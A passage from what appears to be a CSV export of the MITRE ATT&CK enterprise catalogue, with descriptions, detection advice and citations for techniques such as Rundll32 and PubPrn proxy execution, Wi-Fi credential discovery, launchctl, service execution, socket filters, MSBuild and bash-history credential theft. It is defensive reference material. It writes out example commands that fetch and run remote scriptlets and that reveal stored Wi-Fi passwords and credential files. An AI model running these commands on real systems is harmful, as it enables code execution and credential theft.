FireEye APT19),(Citation: KISA Operation Muzabi),(Citation: Unit42 Xbash Sept 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Red Canary Qbot),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: Secure Host Baseline EMET),(Citation: TechNet Applocker vs SRP)"
T1218.011,attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5,System Binary Proxy Execution: Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",https://attack.mitre.org/techniques/T1218/011,23 January 2020,14 August 2023,enterprise-attack,2.2,Defense Evasion,"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.

Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",Windows,"Command: Command Execution, File: File Metadata, Module: Module Load, Process: Process Creation",True,T1218,"Anti-virus, Application control, Digital Certificate Validation","Casey Smith; Gareth Phillips, Seek Ltd.; James_inthe_box, Me; Ricardo Dias",,,,,,"(Citation: Symantec Orangeworm April 2018),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Booz Allen Hamilton),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Secure List Bad Rabbit),(Citation: FireEye FELIXROOT July 2018),(Citation: Crowdstrike DNC June 2016),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: HP SVCReady Jun 2022),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Mandiant FIN12 Oct 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Arbor Musical Chairs Feb 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Medium KONNI Jan 2020),(Citation: Microsoft SIR Vol 19),(Citation: Mandiant APT41),(Citation: FireEye APT19),(Citation: Volexity Exchange Marauder March 2021),(Citation: ESET Dukes October 2019),(Citation: Korean FSI TA505 2020),(Citation: Red Canary Qbot),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Dell Sakula),(Citation: Unit 42 Playbook Dec 2017),(Citation: ESET Lazarus Jun 2020),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky Carbanak),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: Emissary Trojan Feb 2016),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Cybereason Egregor Nov 2020),(Citation: F-Secure Sofacy 2015),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: ESET Telebots July 2017),(Citation: Crysys Skywiper),(Citation: Symantec Briba May 2012),(Citation: Sophos Ragnar May 2020),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Lotus Blossom Jun 2015),(Citation: ESET GreyEnergy Oct 2018),(Citation: Cyberint Qakbot May 2021),(Citation: F-Secure CozyDuke),(Citation: FireEye Clandestine Fox),(Citation: Talos Nyetya June 2017),(Citation: ESET Zebrocy May 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: Prevailion EvilNum May 2020),(Citation: Palo Alto Sofacy 06-2018),(Citation: Palo Alto Comnie),(Citation: Cylance Shell Crew Feb 2017),(Citation: IBM MegaCortex),(Citation: ESET Operation Groundbait),(Citation: ESET Gamaredon June 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Mandiant FIN7 Apr 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Cybereason TA505 April 2019),(Citation: CopyKittens Nov 2015),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Talos Kimsuky Nov 2021),(Citation: Talos Seduploader Oct 2017),(Citation: Novetta Winnti April 2015),(Citation: Symantec Bumblebee June 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: ATT QakBot April 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Rancor Unit42 June 2018),(Citation: Unit42 Redaman January 2019),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Costa AvosLocker May 2022),(Citation: Github Koadic),(Citation: ESET RTM Feb 2017),(Citation: Microsoft Winnti Jan 2017),(Citation: ESET InvisiMole June 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: ESET Hermetic Wizard March 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ClearSky Wilted Tulip July 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1218.012,attack-pattern--808e6329-ca91-4b87-ac2d-8eadc5f8f327,System Binary Proxy Execution: Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)

Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) ",https://attack.mitre.org/techniques/T1218/012,10 August 2020,20 May 2022,enterprise-attack,2.0,Defense Evasion,"Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications.",Windows,"Command: Command Execution, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Rodrigo Garcia, Red Canary",,,,,,"(Citation: Red Canary Verclsid.exe),"
T1614.001,attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19,System Location Discovery: System Language Discovery,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)

There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) 

For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)

On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",https://attack.mitre.org/techniques/T1614/001,18 August 2021,15 October 2021,enterprise-attack,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access",True,T1614,,"Harshal Tupsamudre, Qualys",User,,,,,"(Citation: McAfee Maze March 2020),(Citation: Mcafee Clop Aug 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: CrowdStrike Ryuk January 2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: Kaspersky Sodin July 2019),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: McAfee Cuba April 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: Group IB GrimAgent July 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cylance Dust Storm),(Citation: trendmicro xcsset xcode project 2020),(Citation: Microsoft NICKEL December 2021),(Citation: Talos Zeus Panda Nov 2017),(Citation: FireEye FiveHands April 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: NCC Group Team9 June 2020),"
T1016.001,attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc,System Network Configuration Discovery: Internet Connection Discovery,"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.

Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",https://attack.mitre.org/techniques/T1016/001,17 March 2021,25 March 2021,enterprise-attack,1.0,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to check Internet connectivity.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1016,,,User,,,,,"(Citation: Microsoft Actinium February 2022),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Mandiant UNC3890 Aug 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Cisco Operation Layover September 2021),(Citation: Kaspersky QakBot September 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: ESET ComRAT May 2020),(Citation: Microsoft NICKEL December 2021),(Citation: DFIR Phosphorus November 2021),(Citation: Lunghi Iron Tiger Linux),(Citation: Mandiant FIN13 Aug 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Security Intelligence More Eggs Aug 2019),"
T1016.002,attack-pattern--494ab9f0-36e0-4b06-b10d-57285b040a06,System Network Configuration Discovery: Wi-Fi Discovery,"Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.

Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)

On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)
",https://attack.mitre.org/techniques/T1016/002,08 September 2023,05 October 2023,enterprise-attack,1.0,Discovery,This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.,"Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution",True,T1016,,"Alex Spivakovsky, Pentera; Christopher Peacock; Liran Ravich, CardinalOps; Uriel Kosayev",,,,,,"(Citation: Check Point APT35 CharmPower January 2022),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Malwarebytes Agent Tesla April 2020),"
T1216.001,attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58,System Script Proxy Execution: PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",https://attack.mitre.org/techniques/T1216/001,03 February 2020,18 April 2022,enterprise-attack,2.0,Defense Evasion,"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",Windows,"Command: Command Execution, Process: Process Creation, Script: Script Execution",True,T1216,"Application Control, Digital Certificate Validation","Atul Nair, Qualys",,,,,,"(Citation: Twitter ItsReallyNick Status Update APT32 PubPrn),(Citation: Microsoft_rec_block_rules)"
T1569.001,attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d,System Services: Launchctl,"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)

Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)
",https://attack.mitre.org/techniques/T1569/001,10 March 2020,15 October 2021,enterprise-attack,1.1,Execution,"Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line <code>launchctl</code> command. Plist files are located in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code> folders. 

Monitor command-line execution of the <code>launchctl</code> command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations are potentially suspicious. 

When removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure the services are unloaded prior to deleting plist files.",macOS,"Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation",True,T1569,,,"root, User",,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: ESET LoudMiner June 2019),(Citation: Securelist Calisto July 2018),(Citation: SentinelLabs reversing run-only applescripts 2021),"
T1569.002,attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4,System Services: Service Execution,"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",https://attack.mitre.org/techniques/T1569/002,10 March 2020,14 August 2023,enterprise-attack,1.2,Execution,"Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",Windows,"Command: Command Execution, Network Traffic: Network Traffic Flow, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification",True,T1569,,,,1.0,,,,"(Citation: Savill 1999),(Citation: Sophos Ragnar May 2020),(Citation: Talos TinyTurla September 2021),(Citation: Medium S2W WhisperGate January 2022),(Citation: Medium Anchor DNS July 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Symantec Buckeye),(Citation: NCC Group Chimera January 2021),(Citation: ESET Attor Oct 2019),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Bitdefender StrongPity June 2020),(Citation: GitHub PoshC2),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Talos Nyetya June 2017),(Citation: xCmd),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: FoxIT Wocao December 2019),(Citation: ESET Okrum July 2019),(Citation: Cylance Cleaver),(Citation: Novetta Winnti April 2015),(Citation: NCC Group WastedLocker June 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Mandiant FIN12 Oct 2021),(Citation: Gh0stRAT ATT March 2019),(Citation: ESET OceanLotus Mar 2019),(Citation: Cyberreason Anchor December 2019),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Impacket Tools),(Citation: Talos ZxShell Oct 2014),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Talos Promethium June 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: Russinovich Sysinternals),(Citation: Microsoft Wingbird Nov 2017),(Citation: Group IB Silence Sept 2018),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: McAfee Honeybee),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Github Koadic),(Citation: Sophos Netwalker May 2020),(Citation: Github PowerShell Empire),(Citation: SecureList Silence Nov 2017),(Citation: Talos Olympic Destroyer 2018),(Citation: US-CERT NotPetya 2017),(Citation: Unit 42 WhisperGate January 2022),(Citation: BitDefender Chafer May 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Chafer February 2018),(Citation: FireEye APT41 March 2020),(Citation: Palo Alto Networks BBSRAT),(Citation: McAfee Shamoon December19 2018),(Citation: Secpod Winexe June 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: cobaltstrike manual),(Citation: ESET LoudMiner June 2019),(Citation: GitHub Pupy),(Citation: CERT-FR PYSA April 2020),(Citation: McAfee GhostSecret),(Citation: Group IB APT 41 June 2021),(Citation: Microsoft SIR Vol 21),(Citation: win10_asr)"
T1205.001,attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd,Traffic Signaling: Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",https://attack.mitre.org/techniques/T1205/001,01 July 2020,11 March 2022,enterprise-attack,1.1,"Command and Control, Defense Evasion, Persistence","Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","Linux, Network, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1205,,,User,,,,,"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: Bitdefender StrongPity June 2020),"
T1205.002,attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520,Traffic Signaling: Socket Filters,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",https://attack.mitre.org/techniques/T1205/002,30 September 2022,20 October 2022,enterprise-attack,1.0,"Command and Control, Defense Evasion, Persistence",Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.(Citation: crowdstrike bpf socket filters),"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Process: Process Creation",True,T1205,,CrowdStrike; Tim (Wadhwa-)Brown,,,,,,"(Citation: Leonardo Turla Penquin May 2020),"
T1127.001,attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96,Trusted Developer Utilities Proxy Execution: MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)

Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",https://attack.mitre.org/techniques/T1127/001,27 March 2020,14 August 2023,enterprise-attack,1.3,Defense Evasion,Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1127,,"@ionstorm; Carrie Roberts, @OrOneEqualsOne",,,.NET Framework version 4 or higher,,,"(Citation: Talos Frankenstein June 2019),(Citation: Github PowerShell Empire),(Citation: Palo Alto PlugX June 2017),(Citation: Microsoft WDAC)"
T1552.003,attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3,Unsecured Credentials: Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",https://attack.mitre.org/techniques/T1552/003,04 February 2020,08 March 2022,enterprise-attack,1.1,Credential Access,"Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like ""history"" instead of commands like <code>cat ~/.bash_history</code>.","Linux, macOS","Command: Command Execution, File: File Access",True,T1552,,,User,,,,,"(Citation: Aqua Kinsing April 2020),"
T1552.008,attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3,Unsecured Credentials: Chat Messages,"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.

Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).",https://attack.mitre.org/techniques/T1552/008,14 March 2023,11 April 2023,enterprise-attack,1.0,Credential Access,,"Google Workspace, Office 365, SaaS",Application Log: Application Log Content,True,T1552,,Douglas Weir,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),"
T1552.005,attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3,Unsecured Credentials: Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.

